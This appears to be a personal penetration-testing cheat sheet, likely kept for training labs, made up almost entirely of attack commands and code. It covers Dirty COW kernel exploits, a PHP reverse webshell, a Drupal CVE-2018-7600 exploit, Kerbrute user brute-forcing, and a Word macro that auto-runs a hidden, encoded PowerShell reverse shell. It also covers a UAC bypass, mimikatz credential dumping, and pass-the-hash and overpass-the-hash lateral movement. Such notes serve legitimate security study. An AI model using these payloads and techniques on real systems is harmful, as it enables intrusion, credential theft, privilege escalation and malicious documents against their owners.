[[#Drupal 7 through 7 57 RCE]]

[[#Word Macro]]

[[#UAC Bypass]] - Escalate

[[#Dumping Hashes]] - Escalate

[[#OverPassTheHash]] - Lateral

[[#Pass the hash]] - Lateral

[[#Kerbrute Users]] - AD Enumeration

[[#Reverse php webshell]]

[[#Scrape a word list]]

[[#Linux Kernel Exploits]]
- [[#Dirty Cow2]]

[[#Login Attacks]]

# Login Attacks
If you get a username and need to password guess, try this order:
1. Use found data. (username, hashes, previous flags, [[#Scrape a word list]]).
2. Use large wordlists (rockyou.txt)

# Linux Kernel Exploits
Use [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester.git) to find exploits from the `uname -a` result. Works OFFLINE

```bash
/opt/linux-exploit-suggester/linux-exploit-suggester.py -u '<uname string>'
```
!!!! MAKE SURE TO CHECK THE COMMENTS FOR REQUIREMENTS
![[Pasted image 20220505162755.png]]


## Dirty Cow2
```bash
searchsploit -m 40847
```
[[Data Sharing#Python3 webserver]] to victim

Compile & run on victim
```bash
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil && ./dcow -s
```

## Another Dirty Cow2
```bash
searchsploit -m 40611
```
[[Data Sharing#Python3 webserver]] to victim

Compile & run on victim
```bash
gcc -pthread dirtyc0w.c -o dirtyc0w
```




# Scrape a word list
```bash
cewl <url> -m 6 -w wordlist.txt -d 0
```
`-d` is the spider depth.
then clean up non-human chars
```bash
strings wordlist.txt > wordlist_cleaned.txt
```

# Reverse php webshell
copy the binary to your working folder
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```
Remove the comments and change IP/port
![[Pasted image 20220505124836.png]]
[[Data Sharing#Python3 webserver]] to the victim
Activate the shell by visiting the webpage `site.example/php-reverse-shell.php`
[[The Sprawl - Getting comfy#fix broken bash shell]] for better shell

# Drupal 7 through 7.57 RCE
[exploit for drupal 7 < 7.57](https://github.com/pimps/CVE-2018-7600)
```bash
./drupa7-CVE-2018-7600.py -c whoami http://lampiano:1898/
```

# Kerbrute Users
Brute-force user names.
```bash
kerbrute userenum --dc 10.11.1.120 -d xor.com /usr/share/seclists/Usernames/userlist.txt | tee brute-users.txt
```

Deduplicate and sort
```bash
cat brute-users.txt | cut -d ' ' -f 8 | tr '[:upper:]' '[:lower:]' | sort -u > users.txt
```

# Office Macro - Word/Excel
Create a macro
```vbascript
Sub AutoOpen()
MyMacro
End Sub
Sub Document_Open()
MyMacro
End Sub
Sub MyMacro()
Dim Str As String

<paste_payload_here>

CreateObject("Wscript.Shell").Run Str
End Sub

```

Generate msfvenom reverse shell payload
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f hta-psh
```

split the payload (VBA has a char limit per line)
```python2.7
str = "powershell.exe -nop -w hidden -e <encoded payload from msfvenom command>"

n = 50

for i in range(0, len(str), n):
        print "Str = Str + " + '"' + str[i:i+n]+'"'
```

#### example final macro:
```vbascript
Sub AutoOpen()
MyMacro
End Sub
Sub Document_Open()
MyMacro
End Sub
Sub MyMacro()
Dim Str As String

Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
..
..
Str = Str + "uAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzA"
Str = Str + "CkAOwA="

CreateObject("Wscript.Shell").Run Str
End Sub

```

# UAC Bypass
Increase integrtiy level without alerting the user.

![[Pasted image 20220504173921.png]]
1. Get [EventViewer bypass - PS1](https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1)
1. [[Data Sharing#Python3 webserver]] to windows
1. Generate [[#Reverse encoded Powershell]]
1. Listen to the port on kali
1. Fire
```powershell
Invoke-EventVwrBypass -Command "<encoded reverse shell>"
```

Or try the standalone:
[EventViewer bypass - C](https://github.com/turbo/zero2hero)

# Reverse encoded Powershell
Generate [encoded powershell reverse shell](https://www.revshells.com/)


# Dumping Hashes
[[Data Sharing#Python3 webserver]] to get `mimikatz.exe`
```cmd
mimikatz.exe
```

```mimikatz
privilege::debug
```

```mimikatz
sekurlsa::logonpasswords
```


# OverPassTheHash
get NTML hashes by [[#Dumping Hashes]] 

Start a process as another user
```mimikatz
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell.exe
```

authenticate to another service as the user to create `TGS` and `TGT`
```powershell
net use \\dc01
```

view ticket (optional)
```powershell
klist
```

RCE with [PSExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
```powershell
.\PsExec.exe \\dc01 cmd.exe -accepteula
```

# Pass the hash
[[#Dumping Hashes]]

Test
```bash
crackmapexec smb <ip> -u administrator -H <hash> -d local
```

- Generate [[#Reverse encoded Powershell]]
- Start a listener

Get a shell
```bash
crackmapexec smb <ip> -u administrator -H <hash> -d local -X "<payload>"
```


